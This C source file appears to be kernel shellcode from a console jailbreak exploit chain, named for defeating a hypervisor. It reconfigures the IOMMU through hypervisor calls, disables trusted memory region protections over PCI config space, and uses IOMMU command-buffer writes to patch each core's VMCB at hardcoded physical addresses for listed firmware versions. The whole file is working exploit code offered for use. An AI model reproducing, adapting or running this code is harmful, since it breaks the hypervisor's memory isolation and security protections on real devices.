#include "hv_defeat_0304.h"
#include "../include/config.h"
#include "shellcode_kernel_args.h"
#include "utils.h"

uint32_t (*hv_iommu_set_buffers)(uint64_t cb2_pa, uint64_t cb3_pa,
                                 uint64_t eb_pa, uint64_t unk, int *n_devices);
uint32_t (*hv_iommu_wait_completion)(void);

int hv_defeat_0304(volatile shellcode_kernel_args *args_ptr) {
  uint64_t softc = *(uint64_t *)args_ptr->iommu_softc;
  uint64_t mmio_va = *(uint64_t *)(softc + IOMMU_SC_MMIO_VA);
  uint64_t cb2_va = *(uint64_t *)(softc + IOMMU_SC_CB2_PTR);
  uint64_t cb3_va = *(uint64_t *)(softc + IOMMU_SC_CB3_PTR);
  uint64_t eb_va = *(uint64_t *)(softc + IOMMU_SC_EB_PTR);

  uint64_t iommu_cb2_pa = vtophys(args_ptr->dmap_base, cb2_va);
  uint64_t iommu_cb3_pa = vtophys(args_ptr->dmap_base, cb3_va);
  uint64_t iommu_eb_pa = vtophys(args_ptr->dmap_base, eb_va);

  uint64_t unk;
  int n_devices;

  // Reconfigure IOMMU calling the HV
  int ret = ((uint64_t(*)(uint64_t, uint64_t, uint64_t, uint64_t,
                          int *))args_ptr->fun_hv_iommu_set_buffers)(
      iommu_cb2_pa, iommu_cb3_pa, iommu_eb_pa, (uint64_t)&unk, &n_devices);
  if (ret != 0) {
    puts_uart(args_ptr->dmap_base, (char[]){"IOMMU sb X\n"});
    return -1;
  }

  ret = ((uint64_t(*)(void))args_ptr->fun_hv_iommu_wait_completion)();
  if (ret) {
    puts_uart(args_ptr->dmap_base, (char[]){"IOMMU sb NO OK\n"});
    return -1;
  }

  puts_uart(args_ptr->dmap_base, (char[]){"IOMMU sb OK\n"});

  if (tmr_disable(args_ptr->dmap_base)) {
    puts_uart(args_ptr->dmap_base, (char[]){"TMR NO OK\n"});
    return -1;
  }

  puts_uart(args_ptr->dmap_base, (char[]){"TMR OK\n"});

  patch_vmcb(args_ptr);
  puts_uart(args_ptr->dmap_base, (char[]){"VMCB OK\n"});

  // Re-do this to force a VMEXIT without HV injecting faults
  ((uint64_t(*)(uint64_t, uint64_t, uint64_t, uint64_t,
                int *))args_ptr->fun_hv_iommu_set_buffers)(
      iommu_cb2_pa, iommu_cb3_pa, iommu_eb_pa, (uint64_t)&unk, &n_devices);
  ((uint64_t(*)(void))args_ptr->fun_hv_iommu_wait_completion)();
  puts_uart(args_ptr->dmap_base, (char[]){"Back from HV\n"});

  return 0;
}

__attribute__((noinline, optimize("O0"))) void
iommu_submit_cmd(volatile shellcode_kernel_args *args_ptr, uint64_t *cmd) {
  uint64_t softc = *(uint64_t *)args_ptr->iommu_softc;
  uint64_t mmio_va = *(uint64_t *)(softc + IOMMU_SC_MMIO_VA);
  uint64_t cb2_va = *(uint64_t *)(softc + IOMMU_SC_CB2_PTR);

  uint64_t curr_tail = *((uint64_t *)mmio_va + IOMMU_MMIO_CB_TAIL / 8);
  uint64_t next_tail = (curr_tail + IOMMU_CMD_ENTRY_SIZE) & IOMMU_CB_MASK;

  uint64_t *cmd_buffer = (uint64_t *)cb2_va + curr_tail / 8;

  cmd_buffer[0] = cmd[0];
  cmd_buffer[1] = cmd[1];

  __asm__ volatile("" : : : "memory");

  *((uint64_t *)mmio_va + IOMMU_MMIO_CB_TAIL / 8) = next_tail;

  while (*((uint64_t *)mmio_va + IOMMU_MMIO_CB_HEAD / 8) !=
         *((uint64_t *)mmio_va + IOMMU_MMIO_CB_TAIL / 8))
    ;
}

__attribute__((noinline, optimize("O0"))) void
iommu_write8_pa(volatile shellcode_kernel_args *args_ptr, uint64_t pa,
                uint64_t val) {
  uint32_t cmd[4] = {0};
  cmd[0] = (uint32_t)(pa & 0xFFFFFFF8) | 0x05;
  cmd[1] = ((uint32_t)(pa >> 32) & 0xFFFFF) | 0x10000000;
  cmd[2] = (uint32_t)(val);
  cmd[3] = (uint32_t)(val >> 32);
  iommu_submit_cmd(args_ptr, (uint64_t *)cmd);
}

static uint64_t get_vmcb(volatile shellcode_kernel_args *args_ptr, int core) {
  switch (args_ptr->fw_version) {
  case 0x0300:
  case 0x0310:
  case 0x0320:
  case 0x0321:
    return (uint64_t)0x6290B000 + (uint64_t)core * 0x3000;
  case 0x0400:
  case 0x0402:
  case 0x0403:
  case 0x0450:
  case 0x0451:
    return (uint64_t)0x62A05000 + (uint64_t)core * 0x3000;
  default:
    return -1;
  }
}

__attribute__((noinline, optimize("O0"))) void
patch_vmcb(volatile shellcode_kernel_args *args_ptr) {
  for (int i = 0; i < 16; i++) {
    iommu_write8_pa(args_ptr, get_vmcb(args_ptr, i) + 0x90, 0);
  }
}

__attribute__((noinline, optimize("O0"))) uint32_t tmr_read(uint64_t dmap,
                                                            uint32_t addr) {
  *(uint32_t *)(dmap + ECAM_B0D18F2 + TMR_INDEX_OFF) = addr;
  return *(uint32_t *)(dmap + ECAM_B0D18F2 + TMR_DATA_OFF);
}

__attribute__((noinline, optimize("O0"))) void
tmr_write(uint64_t dmap, uint32_t addr, uint32_t val) {
  *(uint32_t *)(dmap + ECAM_B0D18F2 + TMR_INDEX_OFF) = addr;
  *(uint32_t *)(dmap + ECAM_B0D18F2 + TMR_DATA_OFF) = val;
}

__attribute__((noinline, optimize("O0"))) int tmr_disable(uint64_t dmap) {
  for (int i = 0; i < 24; i++) {
    if (tmr_read(dmap, TMR_CONFIG(i)) != 0) {
      tmr_write(dmap, TMR_CONFIG(i), 0);
      if (tmr_read(dmap, TMR_CONFIG(i)) != 0) {
        return -1;
      }
    }
  }
  return 0;
}
